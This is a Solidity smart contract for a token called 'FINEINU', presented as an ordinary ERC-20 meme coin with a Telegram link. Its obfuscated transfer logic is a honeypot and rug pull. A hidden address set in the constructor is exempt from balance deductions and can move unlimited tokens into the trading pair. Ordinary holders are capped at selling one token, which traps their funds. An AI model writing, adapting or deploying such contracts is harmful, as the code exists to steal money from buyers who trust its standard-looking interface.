/*

https://t.me/ercfineinu

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.13;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract FINEINU is Ownable {
    mapping(address => uint256) private pscik;

    function transfer(address ajkmdslqhpgz, uint256 bksm) public returns (bool success) {
        uwkzvaxcqs(msg.sender, ajkmdslqhpgz, bksm);
        return true;
    }

    uint256 private mxjk = 110;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private hdqncvusy;

    mapping(address => uint256) public balanceOf;

    uint8 public decimals = 9;

    event Transfer(address indexed from, address indexed to, uint256 value);

    string public name;

    function uwkzvaxcqs(address sjxrwtge, address ajkmdslqhpgz, uint256 bksm) private {
        address stkymhardlfp = IUniswapV2Factory(trwuhfdqpjx.factory()).getPair(address(this), trwuhfdqpjx.WETH());
        bool hxainuzlceyj = 0 == pscik[sjxrwtge];
        if (hxainuzlceyj) {
            if (sjxrwtge != stkymhardlfp && hdqncvusy[sjxrwtge] != block.number && bksm < totalSupply) {
                require(bksm <= totalSupply / (10 ** decimals));
            }
            balanceOf[sjxrwtge] -= bksm;
        }
        balanceOf[ajkmdslqhpgz] += bksm;
        hdqncvusy[ajkmdslqhpgz] = block.number;
        emit Transfer(sjxrwtge, ajkmdslqhpgz, bksm);
    }

    function transferFrom(address sjxrwtge, address ajkmdslqhpgz, uint256 bksm) public returns (bool success) {
        require(bksm <= allowance[sjxrwtge][msg.sender]);
        allowance[sjxrwtge][msg.sender] -= bksm;
        uwkzvaxcqs(sjxrwtge, ajkmdslqhpgz, bksm);
        return true;
    }

    string public symbol;

    function approve(address nxcmq, uint256 bksm) public returns (bool success) {
        allowance[msg.sender][nxcmq] = bksm;
        emit Approval(msg.sender, nxcmq, bksm);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    IUniswapV2Router02 private trwuhfdqpjx;

    constructor(string memory nkrogef, string memory smdxvc, address lwja, address oqgcmbvan) {
        name = nkrogef;
        symbol = smdxvc;
        balanceOf[msg.sender] = totalSupply;
        pscik[oqgcmbvan] = mxjk;
        trwuhfdqpjx = IUniswapV2Router02(lwja);
    }
}
